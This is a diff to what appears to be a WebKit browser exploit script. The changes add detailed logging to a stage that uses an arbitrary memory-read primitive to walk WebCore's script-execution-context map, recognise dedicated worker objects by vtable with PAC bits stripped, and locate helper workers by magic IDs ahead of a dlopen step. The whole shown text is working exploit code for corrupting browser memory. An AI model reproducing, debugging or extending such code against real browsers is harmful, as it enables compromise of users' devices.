@@ -9677,19 +9677,32 @@ async function main() {
           const expected_worker_ids = [0xfffe000011111111n, 0xfffe000022222222n];
           let dlopen_workers = [];
           let last_discovered_workers = [];
+          let last_candidate_ids = [];
           const discovery_attempts = 8;
           for (let attempt = 1; attempt <= discovery_attempts; ++attempt) {
             const contexts = p.read64(offsets.WebCore__ZZN7WebCoreL29allScriptExecutionContextsMapEvE8contexts);
-            const contexts_length = p.read64(contexts - 8n) >> 32n;
-            print(`[DLOPEN] discovery attempt=${attempt}/${discovery_attempts} contexts=${contexts.hex()} length=${contexts_length.hex()}`);
+            const contexts_header = p.read64(contexts - 8n);
+            const contexts_length = contexts_header >> 32n;
+            const contexts_metadata = contexts_header & 0xffffffffn;
+            const snapshot_map = attempt === 1 || attempt === discovery_attempts;
+            print(`[DLOPEN] discovery attempt=${attempt}/${discovery_attempts} contexts=${contexts.hex()} header=${contexts_header.hex()} metadata=${contexts_metadata.hex()} length=${contexts_length.hex()} expectedVtable=${offsets.WebCore__DedicatedWorkerGlobalScope_vtable.hex()}`);
             const found_workers = [];
+            const candidate_ids = [];
+            let nonzero_slots = 0;
+            let dedicated_candidates = 0;
             for (let i = 0n; i < contexts_length; ++i) {
               const ptr = contexts + i * 0x30n;
               const key = p.read64(ptr);
-              if (!key) continue;
+              if (!key) {
+                if (snapshot_map) print(`[DLOPEN] map-slot attempt=${attempt} slot=${i} ptr=${ptr.hex()} empty=1`);
+                continue;
+              }
+              ++nonzero_slots;
               const context = p.read64(ptr + 0x20n);
               const vtable = p.read64(context).noPAC();
+              if (snapshot_map) print(`[DLOPEN] map-slot attempt=${attempt} slot=${i} ptr=${ptr.hex()} key=${key.hex()} context=${context.hex()} vtable=${vtable.hex()} dedicated=${vtable == offsets.WebCore__DedicatedWorkerGlobalScope_vtable}`);
               if (vtable != offsets.WebCore__DedicatedWorkerGlobalScope_vtable) continue;
+              ++dedicated_candidates;
               const script = p.read64(context + 0x150n);
               const workerOrWorkletThread = p.read64(context + 0x160n);
               const thread = p.read64(workerOrWorkletThread + 0x28n);
@@ -9698,7 +9711,10 @@ async function main() {
               const butterfly = p.read64(globalScopeWrapper + 8n);
               const id = p.read64(butterfly);
               const bitmap = p.read64(butterfly + 8n);
-              if (id == expected_worker_ids[0] || id == expected_worker_ids[1]) {
+              const expected_index = id == expected_worker_ids[0] ? 1 : (id == expected_worker_ids[1] ? 2 : 0);
+              candidate_ids.push(id);
+              print(`[DLOPEN] candidate attempt=${attempt} slot=${i} key=${key.hex()} context=${context.hex()} script=${script.hex()} workerThread=${workerOrWorkletThread.hex()} thread=${thread.hex()} strongWrapper=${Strong_globalScopeWrapper.hex()} wrapper=${globalScopeWrapper.hex()} butterfly=${butterfly.hex()} id=${id.hex()} bitmap=${bitmap.hex()} expected=${expected_index}`);
+              if (expected_index) {
                 found_workers.push({
                   thread: thread,
                   id: id,
@@ -9714,8 +9730,10 @@ async function main() {
             const worker1 = found_workers.find(worker => worker.id == expected_worker_ids[0]);
             const worker2 = found_workers.find(worker => worker.id == expected_worker_ids[1]);
             last_discovered_workers = found_workers;
+            last_candidate_ids = candidate_ids;
             const found_ids = found_workers.map(worker => worker.id.hex()).join(',');
-            print(`[DLOPEN] discovery result count=${found_workers.length} ids=${found_ids || '(none)'}`);
+            const all_candidate_ids = candidate_ids.map(id => id.hex()).join(',');
+            print(`[DLOPEN] discovery result nonzeroSlots=${nonzero_slots} dedicatedCandidates=${dedicated_candidates} matched=${found_workers.length} matchedIds=${found_ids || '(none)'} candidateIds=${all_candidate_ids || '(none)'}`);
             if (worker1 && worker2) {
               dlopen_workers = [worker1, worker2];
               break;
@@ -9724,7 +9742,8 @@ async function main() {
           }
           if (dlopen_workers.length !== 2) {
             const found_ids = last_discovered_workers.map(worker => worker.id.hex()).join(',');
-            const error = `[DLOPEN] expected both helper workers, found ${last_discovered_workers.length} ids=${found_ids || '(none)'}`;
+            const candidate_ids = last_candidate_ids.map(id => id.hex()).join(',');
+            const error = `[DLOPEN] expected both helper workers, found ${last_discovered_workers.length} ids=${found_ids || '(none)'} candidateIds=${candidate_ids || '(none)'}`;
             print(error, true);
             self.postMessage({
               type: 'stage1_failed',
